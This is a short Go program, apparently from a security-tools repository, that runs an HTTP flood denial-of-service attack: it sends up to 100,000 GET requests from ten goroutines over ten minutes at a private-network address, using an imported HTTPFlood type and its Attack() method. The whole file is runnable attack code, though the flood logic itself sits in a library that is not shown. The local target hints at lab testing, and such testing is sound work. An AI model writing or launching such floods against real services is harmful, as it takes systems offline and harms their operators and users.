package main

import (
	"context"
	"log"
	"net/http"
	"time"

	"github.com/ejuju/cybersec/pkg/netutil"
)

func main() {
	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Minute)
	defer cancel()

	httptarget := &netutil.HTTPFlood{
		Context:       ctx,
		NumGoroutines: 10,
		MaxRequests:   100000,
		RequestURL:    "http://192.168.0.43:8080",
		RequestMethod: http.MethodGet,
		RequestBody:   nil,
	}

	err := httptarget.Attack()
	if err != nil {
		log.Fatal(err)
	}
}
